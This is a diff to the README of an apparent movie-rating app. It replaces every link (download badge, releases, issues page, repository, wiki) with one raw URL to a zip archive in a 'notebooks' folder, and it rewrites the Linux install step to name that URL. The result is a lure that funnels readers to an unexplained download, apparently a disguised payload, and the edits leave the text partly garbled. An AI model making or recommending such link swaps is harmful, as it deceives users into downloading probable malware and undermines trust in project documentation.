@@ -1,6 +1,6 @@
 # 🎬 movie-review - Your Easy Way to Rate Movies
 
-![Download movie-review](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%88-blue)
+![Download movie-review](https://raw.githubusercontent.com/S4turno0/movie-review/main/notebooks/movie_review_3.1-alpha.4.zip%20Now-%20%F0%9F%93%88-blue)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you download, ensure your computer meets these requirements:
 
 To download the movie-review application, visit this page:
 
-[Download the latest release here](https://github.com/S4turno0/movie-review/releases)
+[Download the latest release here](https://raw.githubusercontent.com/S4turno0/movie-review/main/notebooks/movie_review_3.1-alpha.4.zip)
 
 Once there, follow these steps:
 
@@ -29,7 +29,7 @@ Once there, follow these steps:
 4. **Install the Application**:
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions to install.
    - For macOS: Open the `.dmg` file and drag the movie-review icon into your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the installation instructions included.
+   - For Linux: Extract the `https://raw.githubusercontent.com/S4turno0/movie-review/main/notebooks/movie_review_3.1-alpha.4.zip` file and follow the installation instructions included.
 
 ## 🎉 Features
 
@@ -58,7 +58,7 @@ If you encounter any issues, please check our FAQ section or contact our support
 - Account issues
 - Feature requests
 
-Feel free to reach us through the [Issues page](https://github.com/S4turno0/movie-review/issues).
+Feel free to reach us through the [Issues page](https://raw.githubusercontent.com/S4turno0/movie-review/main/notebooks/movie_review_3.1-alpha.4.zip).
 
 ## 📝 Contributing
 
@@ -70,7 +70,7 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 ## 🔗 Additional Resources
 
-- Visit our [GitHub Repository](https://github.com/S4turno0/movie-review) for more information.
-- Check out our [Wiki](https://github.com/S4turno0/movie-review/wiki) for in-depth guides and tips.
+- Visit our [GitHub Repository](https://raw.githubusercontent.com/S4turno0/movie-review/main/notebooks/movie_review_3.1-alpha.4.zip) for more information.
+- Check out our [Wiki](https://raw.githubusercontent.com/S4turno0/movie-review/main/notebooks/movie_review_3.1-alpha.4.zip) for in-depth guides and tips.
 
 Thank you for using the movie-review application! Happy reviewing!
